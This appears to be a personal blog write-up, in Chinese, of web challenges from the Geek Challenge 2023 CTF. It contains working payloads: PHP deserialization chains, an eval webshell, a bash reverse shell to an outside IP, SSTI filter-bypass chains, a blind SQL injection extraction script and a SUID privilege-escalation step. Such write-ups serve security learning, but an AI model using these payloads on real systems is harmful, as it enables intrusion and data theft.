---
title: "极客大挑战2023"
date: 2023-11-02
categories: 
  - "ctf"
tags: 
  - "ctf"
  - "geekchallenge"
coverImage: "1698936191-image.png"
---

## **_前言_**

本校的极客大挑战还是要参加的，去年就很遗憾，今年得好好打一下，这次我会把能写的全写在博客里，同时也会学习一下其他的方向

组队的队友是外校大三的网工学长，很强的选手！

* * *

题目没有分week，这里我就分类，按照时间题目发布时间/做出来的顺序来写了

以校外赛道21名的成绩结束比赛，学到了很多东西！

* * *

## WEB

### EzHttp

**http签到，点击就送flag http://1.117.175.65:23333/**

第一关：请post传参username和password进行登录

账号密码在

![](./images/1698932111-image.png)

第二关：必须来源自sycsec.com 👉添加referer头

第三关：请使用Syclover浏览器 👉修改user-agent头

第四关：请从localhost访问 👉经典的XFF头绕过

第五关：请使用Syc.vip代理 👉添加Via头

![](./images/1698932791-image.png)

然后跳转到一个页面

```
 <?php

if($_SERVER['HTTP_O2TAKUXX']=="GiveMeFlag"){
    echo $flag;
}

?> 
```

这段代码的意思是又要一个http头名为O2TAKUXX，值为GiveMeFlag

最终如图👇

![](./images/1698932920-image.png)

### unsign

一道反序列化题，代码如下

```
 <?php
highlight_file(__FILE__);
class syc
{
    public $cuit;
    public function __destruct()
    {
        echo("action!<br>");
        $function=$this->cuit;
        return $function();
    }
}

class lover
{
    public $yxx;
    public $QW;
    public function __invoke()
    {
        echo("invoke!<br>");
        return $this->yxx->QW;
    }

}

class web
{
    public $eva1;
    public $interesting;

    public function __get($var)
    {
        echo("get!<br>");
        $eva1=$this->eva1;
        $eva1($this->interesting);
    }
}
if (isset($_POST['url'])) 
{
    unserialize($_POST['url']);
}

?> 
```

pop链从上往下很明显了：destruct👉invoke👉get

```
<?
class syc
{
public $cuit;
}

class lover
{
public $yxx;
public $QW;

}

class web
{
public $eva1='system';
public $interesting='cat /f*';

}
$syc=new syc();
$lover=new lover();
$web=new web();
$syc->cuit=$lover;
$lover->yxx=$web;
echo serialize($syc);

#O:3:"syc":1:{s:4:"cuit";O:5:"lover":2:{s:3:"yxx";O:3:"web":2:{s:4:"eva1";s:6:"system";s:11:"interesting";s:7:"cat /f*";}s:2:"QW";N;}}
```

### n00b\_Upload

比较简单的文件上传，直接上图👇

![](./images/1698933445-image.png)

在右边有对应的检测项，我这里是前面加了部分图片的内容，末尾加了php的短代码，这里直接使用php会被检测到，文件类型也要改，然后就能命令执行了

### easy\_php

**学了php了，那就来看看这些绕过吧**

```
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);

highlight_file(__FILE__);
include_once('flag.php');
if(isset($_GET['syc'])&&preg_match('/^Welcome to GEEK 2023!$/i', $_GET['syc']) && $_GET['syc'] !== 'Welcome to GEEK 2023!') {
    if (intval($_GET['lover']) < 2023 && intval($_GET['lover'] + 1) > 2024) {
        if (isset($_POST['qw']) && $_POST['yxx']) {
            $array1 = (string)$_POST['qw'];
            $array2 = (string)$_POST['yxx'];
            if (sha1($array1) === sha1($array2)) {
                if (isset($_POST['SYC_GEEK.2023'])&&($_POST['SYC_GEEK.2023']="Happy to see you!")) {
                    echo $flag;
                } else {
                    echo "再绕最后一步吧";
                }
            } else {
                echo "好哩，快拿到flag啦";
            }
        } else {
            echo "这里绕不过去，QW可不答应了哈";
        }
    } else {
        echo "嘿嘿嘿，你别急啊";
    }
}else {
    echo "不会吧不会吧，不会第一步就卡住了吧，yxx会瞧不起你的！";
}
?>
```

第一层：正则匹配，这里的preg\_match函数采用的匹配方式是从头到尾/^abc$/这样的形式，只需要在字符串的最后添加%0a换行符即可绕过

第二层：intval，科学计数法即可绕过，2022e2

第三层：string化的sha1比较，这里只需把参数都以数组形式传进去，经过string强转后值都变成了Array

第四层：`SYC_GEEK.2023`这个字符串存在一个下划线，而下划线被当作参数传进去后会被PHP转为一个点，不过当左括号 \[ 被当作参数传入的时候，会被转为下划线，这里只需要修改其中的下划线为左括号即可。当前前面已经有PHP特殊字符转换的时候，后续的就会被忽略，GEEK和2023的中的点就不用管了

![](./images/1698933959-image.png)

### ctf\_curl

**命令执行？真的吗？**

```
<?php
highlight_file('index.php');
// curl your domain
// flag is in /tmp/Syclover

if (isset($_GET['addr'])) {
    $address = $_GET['addr'];
    if(!preg_match("/;|f|:|\||\&|!|>|<|`|\(|{|\?|\n|\r/i", $address)){
        $result = system("curl ".$address."> /dev/null");
    } else {
        echo "Hacker!!!";
    }
}
?>
```

源码中给了提示了，curl你的域名，这道题需要一个服务器，然后再服务器下写一个php文件，然后在题目中curl自己服务器中的文件，使用-o 参数输出到题目靶机的目录下，然后跳转到其界面即可连接蚁剑或者直接手打

![](./images/1698934184-image.png)

![](./images/1698934219-image.png)

![](./images/1698934352-image.png)

### klf\_ssti

页面源码中给了一个/hack路由，klf是参数，但初步测试没有效果

![](./images/1698934443-image.png)

这里推荐一个SSTImap工具，十分强大，还能直接模拟shell连接

[GitHub - vladko312/SSTImap: Automatic SSTI detection tool with interactive interface](https://github.com/vladko312/SSTImap)

```
D:\SSTImap-master>python sstimap.py -u  http://c6wgxl35yii5gu40b1oi0ob46.node.game.sycsec.com/hack?klf=1 --os-shell
```

检测出来是盲注，反应都会很慢，这里可以把shell反弹到自己的服务器上

```
bash -c "bash -i >& /dev/tcp/101.35.19.78/100 0>&1"
```

![](./images/1698934975-image.png)

![](./images/1698935028-image.png)

再次证明了科技的重要性😂

### ez\_remove

```
<?php
highlight_file(__FILE__);
class syc{
    public $lover;
    public function __destruct()
    {
        eval($this->lover);
    }
}
if(isset($_GET['web'])){
    if(!preg_match('/lover/i',$_GET['web'])){
        $a=unserialize($_GET['web']);
        throw new Error("快来玩快来玩~");
    }
    else{
        echo("nonono");
    }
}
?>
```

两个考点

其一：这个preg\_match正则匹配在这样的模式下，是不存在漏洞的，也就无法使用上面那道题说过的换行符绕过，并且由于序列化字符串的特性，我们并不能修改字符串的值，但是可以改变其进制，当序列化字符串中的s属性为大写时候，就能够识别后面字符串中的十六进制字符

其二：throw出的Error会打断正常的反序列化，从而无法destruct，这里可以通过PHP的GC垃圾回收机制绕过

贴一下文章：[浅析PHP GC垃圾回收机制及常见利用方式（一）-阿里云开发者社区 (aliyun.com)](https://developer.aliyun.com/article/1161068)

![](./images/1698935583-image.png)

![](./images/1698935594-image.png)

上面可以看到能够进行命令执行的命令都被ban了，用不了

这里可以使用php的file\_put\_content函数，写入一个php木马

```
<?php
class syc{
    public $lover="file_put_contents('shell.php', '<?php eval(\$_POST[a])?>');";
    public function __destruct()
    {
        eval($this->lover);
    }
}
$a=new syc();
$s=serialize(array($a,0));
echo serialize(array($a,0));
echo PHP_EOL;
preg_replace('lover','\\6cover',$s);
echo $s;

#再自己修改一下
#a:2:{i:0;O:3:"syc":1:{S:5:"\6cover";s:58:"file_put_contents('shell.php', '<?php eval($_POST[a])?>');";}i:0;i:0;}
```

![](./images/1698935753-image.png)

由于刚才说过，被ban了，这里只能上蚁剑来找了

![](./images/1698935799-image.png)

根目录下打开看不见，并不代表他没有哦

![](./images/1698935825-image.png)

### ez\_path

题目源码给了提示

![](./images/1698935892-image.png)

pyc反编译后看到的部分代码👇

```
# Visit https://www.lddgo.net/string/pyc-compile-decompile for more information
# Version : Python 3.6

import os
import uuid
from flask import Flask, render_template, request, redirect
app = Flask(__name__)
ARTICLES_FOLDER = 'articles/'
articles = []

class Article:
    
    def __init__(self, article_id, title, content):
        self.article_id = article_id
        self.title = title
        self.content = content

def generate_article_id():
    return str(uuid.uuid4())

def index():
    return render_template('index.html', articles, **('articles',))

index = app.route('/')(index)

def upload():
    if request.method == 'POST':
        title = request.form['title']
        content = request.form['content']
        article_id = generate_article_id()
        article = Article(article_id, title, content)
        articles.append(article)
        save_article(article_id, title, content)
        return redirect('/')
    return None('upload.html')

upload = app.route('/upload', [
    'GET',
    'POST'], **('methods',))(upload)

def article(article_id):
    pass
# WARNING: Decompyle incomplete

article = app.route('/article/<article_id>')(article)

def save_article(article_id, title, content):
    sanitized_title = sanitize_filename(title)
    article_path = ARTICLES_FOLDER + '/' + sanitized_title
# WARNING: Decompyle incomplete

def sanitize_filename(filename):
    sensitive_chars = [
        ':',
        '*',
        '?',
        '"',
        '<',
        '>',
        '|',
        '.']
    for char in sensitive_chars:
        filename = filename.replace(char, '_')
    
    return filename

if __name__ == '__main__':
    app.run(True, **('debug',))
```

flask模板搭建的，其他没啥好说的，关键点就在于article\_path拼接的部分，并没有过滤掉/斜杠，可以在读取的时候进行目录穿越，只需要把文章的title设置为/f14444，然后再点开就行了

![](./images/1698936164-image.png)

哈哈，这道题被我拿了一血，高兴一下O(∩\_∩)O

![](./images/1698936191-image.png)

### you konw flask?

两个路由，注册和登录，注册的时候显示admin已被注册，很明显是要伪造admin身份进去

![](./images/1698936371-image.png)

接下来就是要找到secretkey值，进入robots.txt发现一个新的页面

![](./images/1698936446-image.png)

只需要写个脚本爆破一下就行了

```
#!/usr/bin/env python3
""" Flask Session Cookie Decoder """
__author__ = 'Wilson Sumanang, Alexandre ZANNI'

import zlib
from itsdangerous import base64_decode
import ast
import os
from flask.sessions import SecureCookieSessionInterface
import hashlib
import base64
import random

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key

class FSCM:
    @staticmethod
    def decode(session_cookie_value, secret_key=None):
        try:
            if secret_key is None:
                compressed = False
                payload = session_cookie_value
                if payload.startswith('.'):
                    compressed = True
                    payload = payload[1:]
                data = payload.split(".")[0]
                data = base64_decode(data)
                if compressed:
                    data = zlib.decompress(data)
                return data
            else:
                app = MockApp(secret_key)
                si = SecureCookieSessionInterface()
                s = si.get_signing_serializer(app)
                return s.loads(session_cookie_value)
        except Exception as e:
            return "[Decoding error] {}".format(e)

if __name__ == "__main__":
    cnt = 1
    while True:
        cookie_value = 'eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxMjMiLCJ1c2VyX2lkIjoyfQ.ZUO2Eg.dxE1Jqo7vrBWygtgbQ8RndUZHJQ'
        secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao'
        if secret_key:
            result = FSCM.decode(cookie_value, secret_key)
        else:
            result = FSCM.decode(cookie_value)
        cnt += 1
        print(result, cnt)
        if '[Decoding error]' not in result:
            print(result, secret_key, 'YES')
            break
```

![](./images/1698936511-image.png)

找到了key，加密换上进去

![](./images/1698936626-image.png)

在学员管理界面拿到flag

![](./images/1698936657-image.png)

### Pupyy\_rce

悄悄话：这道题是第一周放出来了大概半小时又下线了，后面才放出来，当时我payload都写好了，可惜

源码如下👇

```
 <?php
highlight_file(__FILE__);
header('Content-Type: text/html; charset=utf-8');
error_reporting(0);
include(flag.php);
//当前目录下有好康的😋
if (isset($_GET['var']) && $_GET['var']) {
    $var = $_GET['var'];
   
    if (!preg_match("/env|var|session|header/i", $var,$match)) {
        if (';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $var)){
        eval($_GET['var']);
        }
        else die("WAF!!");
    } else{
        die("PLZ DONT HCAK ME😅");
    }
} 
```

这个正则匹配是经典的无参数RCE模式

使用php的内置函数读取文件即可

![](./images/1698936846-image.png)

当前目录存在flag.php

payload👇

```
?var=show_source(array_rand(array_flip(scandir(current(localeconv())))));
```

这里采用的方法是随机读取当前目录的文件，一直刷新就能读取到flag

![](./images/1698936992-image.png)

### famale\_imp\_l0v

两个php，一个用来上传zip文件，另一个用来包含文件

```
 <?php
//o2takuXX师傅说有问题，忘看了。
header('Content-Type: text/html; charset=utf-8');
highlight_file(__FILE__);
$file = $_GET['file'];
if(isset($file) && strtolower(substr($file, -4)) == ".jpg"){
    include($file);
}
?> 
```

不难想到php伪协议中的zip://伪协议

要先把php文件进行打包进zip，然后上传zip，再到include.php进行文件包含，要注意使用zip伪协议的时候如果想要进一步达到zip里的文件，需要使用 # 井号连接，并且要urlencode

贴一个文章：[【文件上传】zip伪协议上传解析\_zip:///-CSDN博客](https://blog.csdn.net/serendipity1130/article/details/119972780)

![](./images/1698937358-image.png)

![](./images/1698937382-image.png)

### 雨

**VanZY给白月光写了一张明信片，快去帮他把id签上吧**

在hint路由下给出了secret\_key的信息

![](./images/1698977700-image.png)

同时在http头里发现cookie

![](./images/1698977764-image.png)

不过这道题不是flask session，而是jwt token，两者的区别可以自行搜索

两者的加密方式不同，写的脚本也不同

```
import jwt

# 示例用法
payload = {'user': 'admin', 'iat': 1698977214}
secret_key = 'VanZY'

encoded_token = jwt.encode(payload, secret_key, algorithm='HS256')
print(encoded_token.encode())
#eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE2OTg5NzcyMTR9.QsHyTGY5GnM7WWzf69WbkVOj8UySuBpIsTQfR8Jr2q0
```

下面是source源码👇

```
const express = require('express');
const jwt = require('jsonwebtoken');
const app = express();
const bodyParser = require('body-parser')
const path = require('path');
const jwt_secret = "VanZY";
const cookieParser = require('cookie-parser');
const putil_merge = require("putil-merge")
app.set('views', './views');
app.set('view engine', 'ejs');
app.use(cookieParser());
app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())

var Super = {};

var safecode = function (code){
    let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig;
    return !validInput.test(code);
};

app.all('/code', (req, res) => {
  res.type('html');
  if (req.method == "POST" && req.body) {
    putil_merge({}, req.body, {deep:true});
  }
  res.send("welcome to code");
});

app.all('/hint', (req, res) => {
    res.type('html');
    res.send("I heard that the challenge maker likes to use his own id as secret_key");
});

app.get('/source', (req, res) => {
  res.type('html');
  var auth = req.cookies.auth;
  jwt.verify(auth, jwt_secret , function(err, decoded) {
    try{
      if(decoded.user==='admin'){
        res.sendFile(path.join(__dirname + '/index.js'));
      }else{
        res.send('you are not admin    <!--Maybe you can view /hint-->');
      }
    }
    catch{
      res.send("Fuck you Hacker!!!")
    }
  });
});

app.all('/create', (req, res) => {
  res.type('html');
  if (!req.body.name || req.body.name === undefined || req.body.name === null){
    res.send("please input name");
  }else {
    if (Super['userrole'] === 'Superadmin') {
        res.render('index', req.body);
      }else {
        if (!safecode(req.body.name)) {
            res.send("你在做什么？快停下！！！")
        }
        else{
            res.render('index', {name: req.body.name});
        }
      }
  }
});

app.get('/',(req, res) => {
    res.type('html');
    var token = jwt.sign({'user':'guest'},jwt_secret,{ algorithm: 'HS256' });
    res.cookie('auth ',token);
    res.end('Only admin can get source in /source');

});

app.listen(3000, () => console.log('Server started on port 3000'));
```

在create路由下可以看到有一个Superadmin的验证，在code路由下有一个POST传入并且merge合并的过程

不难联想到原型链污染的相关知识，由于Super本身是空的，我们需要在code页面下POST一个JSON包污染object的原型，从而使所有对象都带有userrole属性且值为Superadmin

![](./images/1698984341-image.png)

这里我用\_\_proto\_\_不知道怎么不行，只能使用constructor来实现，这个在0xgame比赛里有用到过

在这里贴两个文章

[理解原型链污染 - depy (rce.ink)](https://rce.ink/index/view/328.html)

[Node.js原型链污染的利用 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/264966.html)

污染之后再进入create路由下，name参数就没有任何限制了

经过后来学习，这道题和name没什么关系，主要还是ejs这个模板的render渲染问题

这个模板是存在CVE漏洞的，网上可以搜一下

这道题和HGAME2023中WEEK4的Shared Dairy比较相似，可以找官方WP看看，这里不再赘述

由于这个ejs的版本比较高，原本的outputFunctionName在这里就成为了非法字符，好在官方修复的时候好像漏掉了一个escapeFunction，刚好可以利用

直接说做题步骤，现在code页面进行原型链污染，注意箭头指的地方

![](./images/1699017978-image.png)

然后只修改第一行的code为create，其他的别动，也别另外开一个repeater，就在这一个操作

![](./images/1699018042-image.png)

得到flag的名字，然后再回到code页面修改命令执行，最后跳回create界面即可

![](./images/1699018096-image.png)

针对于这个ejs模板，我再贴几个文章：

[https://inhann.top/2023/03/26/ejs/](https://inhann.top/2023/03/26/ejs/)

[https://thnpkm.xyz/index.php/archives/111/](https://thnpkm.xyz/index.php/archives/111/)

[https://www.ctfiot.com/120877.html](https://www.ctfiot.com/120877.html)

### klf\_2

![](./images/1699675912-image.png)

发现一个secret

![](./images/1699675932-image.png)

参数还是klf，这次用脚本跑不出来了，得用手注

![](./images/1699675970-image.png)

这次过滤的很严格，比如常见的关键字：class，global，getitem等等

以及一些特殊符号：单双引号、中括号、加减乘除、斜杠等等

不过好在可以通过set方法来处理字符串

我这里就直接上payload来对着说吧

```
http://qkxc2u105bpv62hkormtdb5oc.node.game.sycsec.com/secr3ttt?klf=
{%set b=dict(po=1,p=2)|join%}#用于提取字符串中的某个字符，用法pop(5)
{%set line=(lipsum|string|list)|attr(b)(18) %} #通过lipsum来获取单个下划线
{%set towline=(line,line)|join %} #下划线组合成两个下划线
{%set glbs=((towline,dict(glo=1,bals=2)|join)|join,towline)|join%}#dict合成__globals__关键字
{%set gtitem=(towline,dict(ge=1,titem=2)|join,towline)|join%} #dict合成__getitem__关键字
{%set pp=dict(po=a,pen=2)|join%} #dict合成popen关键字
{%set oo=dict(o=a,s=b)|join%}  #os
{%set rd=dict(re=1,ad=2)|join%} #read 
{%set kg=lipsum|string|list|attr(b)(9)%} #获取空格
{%set bult=(towline,dict(bui=1,ltins=2)|join,towline)|join%} #获取__builtins__
{%set ch=dict(ch=1,r=2)|join%} #获取chr字符串，因为特殊符号斜杠被过滤了，这里只能使用chr来创建 
{%set gt=dict(get=a)|join%} #get
{%set cha=(lipsum|attr(glbs))|attr(gt)(bult)|attr(gt)(ch)%} #创建chr函数
{%set rd=dict(re=1,ad=2)|join%} #read ？上面好像写过了 。。。。。我的
{%set sv=lipsum|string|list|attr(b)(36)%}  #获取数字7，因为斜杠\的ascii是47，这里7是会被检测
{%set f=4%} #获取4
{%set ap=dict(ap=1,p=2)|join%} #我在当前目录没有找到flag，真的flag在/app路由下
{%set n=(f,sv)|join|int%} #组成47的数字，这个int有必要
{%set fl=dict(f=1,l=2)|join%} 
{%set gg=(f,dict(g=1)|join)|join%}  #flag的名字叫 fl4gfl4gfl4g
{%set fg=(fl,gg,fl,gg,fl,gg)|join%}  #这连着的三个应该可以优化，我写的有点臃肿
{%set shell=((dict(ca=1,t=2)|join,kg,cha(n))|join,ap,cha(n),fg)|join%}#cat /app/fl4gfl4gfl4g
{{lipsum|attr(glbs)|attr(gtitem)(oo)|attr(pp)(shell)|attr(rd)()}}  #执行完
```

![](./images/1699676728-image.png)

相关链接👇

- [Flask-jinja2 SSTI 一般利用姿势 – AndyNoel's Blog](http://www.andynoel.xyz/?p=244)

- [CTFSHOW SSTI web369-web372 拼接绕过\_ssti 369-CSDN博客](https://blog.csdn.net/jvkyvly/article/details/115276586)

- [关于SSTI注入的二三事 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/11090#toc-17)

有趣的事情：去SYC面试的时候，好像问到SSTI部分，Delty（我觉得应该是他）问我当斜杠被过滤掉的时候怎么办？当时摆头不知道，他就说用builtins这个关键字引入chr函数。做这道题的时候就想起来这件事

### ez\_sql

一道布尔盲注的题目

![](./images/1699776029-image.png)

题目给了一个ID输入框，测试过后是字符型单引号闭合

而且页面有三种回显状态

第一种就是上图的回显查询ID

第二种是输入了非法字符会回显：waf！！！

第三种对应的是查询失败，或者说sql语句有问题，执行出错，但没有报错信息，只会回显：别翻啦！这么多心灵鸡汤都du不了你吗

上burp看看过滤了哪些👇，在intruder里标记参数，字典用的网上随便找的

![](./images/1699776346-image.png)

一些常用的比如：or、sleep、id、substr、mid、left、right、三个报错函数、database、benchmark、count、concat、information\_schema以及空格等等

能用的有：（、）、select、where、like、regexp、union、length、limit、from等等

不难想到这是通过like模糊查询的布尔盲注题目

首先，database被ban了，如何查询数据库呢？（这道题的flag不在当前数据库

用like模糊查询得知当前mysql版本是5.7几，而在5.7之后mysql默认存在一个sys.schema\_table\_statistics\_with\_buffer库，里面存放了所有库的名称，里面的字段名有table\_schema和table\_name，用于存放表以及对应的数据库

那就先来跑一下数据库和表名

![](./images/1699777372-image.png)

![](./images/1699777449-image.png)

如果不加上table名称的限制的话，跑出来的当前数据库就是articles，里面是没有flag的，这里就不再截图

到这一步的话，sys这个表就没什么用处了，因为里面没有字段的名称

接下来就是要使用无列名布尔盲注，join在这里也是被ban了的，不过也有其他的方式

这里放几个文章，我也不再赘述了（懒的打字。。）：

- [Mysql无列名注入/PDO/变量注入 | (guokeya.github.io)](https://guokeya.github.io/post/KZ-7hNWpu/)

- [无列名注入绕过information\_schema – JohnFrod's Blog](https://johnfrod.top/%E5%AE%89%E5%85%A8/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87information_schema/)

- [MySQL LIKE：模糊查询 - 安暖如初 - 博客园 (cnblogs.com)](https://www.cnblogs.com/lizecheng/p/14646054.html)

首先要确定flag表有几列，这个用无列名加上group by看回显就能知道flag只有一列

然后我在本地测试的话，能通过的是下面这种形式的

```
select '0' ||
(select/**/hex(e.c)/**/from (select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/1,1)e/**/where/**/length(hex(e.c))>1/**/and/**/e.c/**/like/**/'%')
||'0';
```

根据这个，针对like的部分写脚本

```
import requests
import string
dic="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&'()*+,-./:;<=>?@[\]^`{|}~_"
url='http://47.108.56.168:1113/'

payload={"id":"0'||(select/**/hex(table_name)/**/from/**/mysql.innodb_table_stats/**/where/**/length(hex(table_name))>1/**/and/**/hex(table_name)/**/like/**/'%'/**/limit/**/0,1)||'0"}
part1="0'||(select/**/hex(e.c)/**//**/from/**/(select/**/c/**/from/**/(select/**/2/**/c/**/union/**/select/**/*/**/from/**/ctf.flll444aaggg9)x/**/limit/**/2,1)e/**//**/where/**/length(hex(e.c))>1/**/and/**//**/e.c/**/like/**/binary/**/'"
#part1="0'||(select/**/hex(table_name)/**/from/**/sys.schema_table_statistics_with_buffer/**/where/**/table_schema/**/like/**/'ctf'/**/and/**/hex(table_name)/**/like/**/'"
part2="%'/**//**/)||'0"
midpart=''

while True:
    check=0

    for i in dic:
        payload={"id":part1+midpart+i+part2}
        print(payload)
        r=requests.post(url,payload).text
        if '别翻啦' not in r and 'waf' not in r and '你搁这' not in r:
            midpart+=i

            print(i)
            check=1
            break;
    if check==0:
        break
    print(midpart)
print(midpart)
#SYC{73hd72hfds68r42yuf874r79v8sd43u89f}
```

注意几个点，dic字典里要把下划线放到最后一个位置，因为like模糊查询里下划线能匹配任意单个字符，不要有百分号

like后面加一个binary用于区分大小写

![](./images/1699777981-image.png)

又拿了一个一血，喜喜🤭

### EzRce

源码如下

```
 <?php
include('waf.php');
session_start();
show_source(__FILE__);
error_reporting(0);
$data=$_GET['data'];
if(waf($data)){
    eval($data);
}else{
    echo "no!";
}
?> 
```

用python跑了一下，能用的字符有这些

```
aelvAELV!"#$%&'()*+,-./:;<=>?@[\]^_`|
```

用异或构造字符串phpinfo()

```
<?php
$e=('L'^'<').('L'^'$').('L'^'<').('L'^'%').('"'^'L').('L'^'*').('#'^'L');//phpinfo
($e)();
#在p神的文章中学到的
```

贴几个文章：

- [老生常谈的无字母数字 Webshell 总结 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/279563.html)

- [无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)

- [一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html?page=2#reply-list)

一些被ban的函数

![](./images/1699790284-image.png)

注意到源码当中有一个session开启的部分，可以进行利用

![](./images/1699858775-image.png)

![](./images/1699858793-image.png)

注意这个data也是要进行异或构成的，这里给一个python脚本

由于在disable\_function里没有禁用file\_put\_contents，于是可以写入一个PHP文件来方便命令执行，同时注意函数的括号嵌套

```
import string
dic='aelvAELV!#$%&'+"()*+,-./:;<=>?@[]^_`|"
want="session_id"
res=""
for c in want:
    for i in dic:
        check=0
        for j in dic:
            if ord(i)^ord(j)==ord(c):
                print(i,j)
                res+=f"('{i}'^'{j}')."
                check=1
                break
        if check==1:
            break
print(res)
```

![](./images/1699858854-image.png)

data的部分的话，每个异或组成的字符串都要额外用一对括号括起来，就像上面的那个phpinfo一样

![](./images/1699859022-image.png)

然后在新建的文件下进行命令执行，更方便一些，不用再转进制

![](./images/1699859153-image.png)

由于在phpinfo里面禁用了大部分的命令执行函数，但是还是可以使用proc\_popen这个函数

贴一个文章：[绕过Disable Functions来搞事情 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/network/263540.html)

这里我是用到反弹shell，因为后面要进行提权，当前权限不能够读取flag，在自己服务器上写一个一句话反弹shell的命令，保存在txt中，再用靶机curl执行，自己服务器开启nc监听

![](./images/1699859293-image.png)

如下，权限不够是读不到的，这里就涉及到suid提权

![](./images/1699859366-image.png)

贴两个文章：

- [SUID提权总结及利用演示 - leviathan123 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zhianku/p/16461103.html#:~:text=%EF%BC%881%EF%BC%89%E8%BF%9B%E5%85%A5shell%E4%BC%9A%E8%AF%9D%EF%BC%8C%E8%BE%93%E5%85%A5%E4%B8%8A%E6%96%87%E6%8F%90%E5%88%B0%E7%9A%84SUID%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%9F%A5%E6%89%BE%E5%91%BD%E4%BB%A4%20find%20%2F%20-user%20root%20-perm%20-4000%20-print,%EF%BC%882%EF%BC%89%E8%BF%9B%E5%85%A5tmp%E7%9B%AE%E5%BD%95%EF%BC%8C%E5%88%9B%E5%BB%BA%E5%90%8D%E4%B8%BA%E2%80%9C111%E2%80%9D%E7%9A%84%E6%96%87%E4%BB%B6%20%EF%BC%883%EF%BC%89%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%A6%82%E5%9B%BE%E5%BD%93%E5%89%8D%E4%B8%BAroot%E6%9D%83%E9%99%90%20%E5%80%9Ffind%E5%91%BD%E4%BB%A4%E7%9A%84%E2%80%9C-exec%E2%80%9D%E5%8F%82%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E2%80%9Cwhoami%E2%80%9D%EF%BC%8C%E7%A1%AE%E5%AE%9A%E6%89%A7%E8%A1%8C%E2%80%9Cfind%E2%80%9D%E6%97%B6%E4%B8%BAroot%E6%9D%83%E9%99%90%20find%20111%20-exec%20whoami%20%3B)

- [红队笔记之Suid提权浅析与利用方法总结\_suid提权、-CSDN博客](https://blog.csdn.net/CoreNote/article/details/122093180)

```
find / -user root -perm -4000 -print 2>/dev/null #在里面查到有find命令，可以操作
```

![](./images/1699859457-image.png)

进入tmp目录touch一个111文件就行了，不用写内容

```
find 111 -exec code \; #这个时候find执行命令的时候就是以root身份，code可控，要切换到tmp目录
```

![](./images/1699859623-image.png)

拿到flag，记得把空格转换为下划线

### ezpython

源码如下👇

```
import json
import os

from waf import waf
import importlib
from flask import Flask,render_template,request,redirect,url_for,session,render_template_string

app = Flask(__name__)
app.secret_key='jjjjggggggreekchallenge202333333'
class User():
    def __init__(self):
        self.username=""
        self.password=""
        self.isvip=False

class hhh(User):
    def __init__(self):
        self.username=""
        self.password=""

registered_users=[]
@app.route('/')
def hello_world():  # put application's code here
    return render_template("welcome.html")

@app.route('/play')
def play():
    username=session.get('username')
    if username:
        return render_template('index.html',name=username)
    else:
        return redirect(url_for('login'))

@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username=request.form.get('username')
        password=request.form.get('password')
        user = next((user for user in registered_users if user.username == username and user.password == password), None)
        if user:
            session['username'] = user.username
            session['password']=user.password
            return redirect(url_for('play'))
        else:
            return "Invalid login"
        return redirect(url_for('play'))
    return render_template("login.html")

@app.route('/register',methods=['GET','POST'])
def register():
    if request.method == 'POST':
        try:
            if waf(request.data):
                return "fuck payload!Hacker!!!"
            data=json.loads(request.data)
            if "username" not in data or "password" not in data:
                return "连用户名密码都没有你注册啥呢"
            user=hhh()
            merge(data,user)
            registered_users.append(user)
        except Exception as e:
            return "泰酷辣,没有注册成功捏"
        return redirect(url_for('login'))
    else:
        return render_template("register.html")

@app.route('/flag',methods=['GET'])
def flag():
    user = next((user for user in registered_users if user.username ==session['username']  and user.password == session['password']), None)
    if user:
        if user.isvip:
            data=request.args.get('num')
            if data:
                if '0' not in data and data != "123456789" and int(data) == 123456789 and len(data) <=10:
                        flag = os.environ.get('geek_flag')
                        return render_template('flag.html',flag=flag)
                else:
                    return "你的数字不对哦!"
            else:
                return "I need a num!!!"
        else:
            return render_template_string('这种神功你不充VIP也想学?<p><img src="{{url_for(\'static\',filename=\'weixin.png\')}}">要不v我50,我送你一个VIP吧,嘻嘻</p>')
    else:
        return "先登录去"

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port="8888")
```

首先看到源码中有一个merge函数，这个在js的原型链污染中有看到过，结合题目信息，得知这道题是关于python原型链污染

首先给两篇文章学习一下👇

- [python原型链污染总结 | H4cking to the Gate . (h4cking2thegate.github.io)](https://h4cking2thegate.github.io/posts/2675/index.html#%E6%B1%A1%E6%9F%93%E7%A4%BA%E4%BE%8B)

- [(\*´∇｀\*) 欢迎回来！ (cnblogs.com)](https://www.cnblogs.com/capz/p/17818200.html)

在注册页面可以抓包尝试添加如下污染内容

![](./images/1700464018-image.png)

